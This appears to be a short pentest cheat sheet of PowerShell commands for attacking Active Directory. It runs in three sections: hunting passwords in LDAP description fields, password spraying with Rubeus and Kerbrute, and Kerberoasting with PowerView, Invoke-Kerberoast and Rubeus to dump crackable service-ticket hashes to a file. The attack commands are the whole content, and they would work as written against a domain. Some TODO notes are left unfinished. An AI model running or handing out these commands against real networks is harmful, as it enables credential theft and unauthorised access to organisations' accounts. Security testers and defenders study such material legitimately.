# 1. Sensitive Data in LDAP

1.) Start ADExplorer and search through the AD for sensitive information

PS> adexplorer.exe

ADexplorer> search user description field contains pw, pwd, password, pass

2.) Enumerate the AD with ADRecon

PS> .\ADRecon.ps1

PS> .\ADRecon.ps1 -GenExcel .\ADRecon-Report-timestamp

TODO: wget Excel file since Excel will not be installed

# 2. Password Spraying

1.) Identify the standard domain password and start a password spray attack

a.) Use Rubeus
PS> .\Rubeus.exe brute /password:Start123!

b.) Use Kerbrute
PS> Invoke-WebRequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile ".\kerbrute.exe"

PS> Import-Module .\PowerView.ps1

PS> (Get-NetUser | select samAccountName).samAccountName > users.txt

PS> .\kerbrute.exe passwordspray --domain contoso.azure .\users.txt Start123!

ToDo error

# 3. Kerberoasting
## Identify Kerberoastable users
### PowerView
PS> Import-Module .\PowerView.ps1

PS> Get-NetUser | Where-Object {$_.servicePrincipalName} | fl

PS> Get-NetUser -SPN | ft serviceprincipalname, samaccountname, cn, pwdlastset 

### PowerView-Dev
PS> Import-Module .\PowerView-dev.ps1

PS> Get-DomainUser | Where-Object {$_.servicePrincipalName} | fl

PS> Get-DomainUser -SPN | ft serviceprincipalname, samaccountname, cn, pwdlastset 

### Invoke-Kerberoast
PS> Import-Module .\Invoke-Kerberoast.ps1

PS> Invoke-Kerberoast

### Rubeus
PS> .\Rubeus.exe kerberoast

## Get TGS Kerberos Tickets
### PowerView-Dev
PS> Import-Module .\PowerView-dev.ps1

Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | % { $_.Hash } | Out-File -Encoding ASCII kerberoasted.txt

### Invoke-Kerberoast
PS> Import-Module .\Invoke-Kerberoast.ps1

PS> Invoke-Kerberoast | % { $_.Hash } | Out-File -Encoding ASCII kerberoasted.txt

### Rubeus
PS> .\Rubeus.exe kerberoast /outfile:kerberoasted.txt
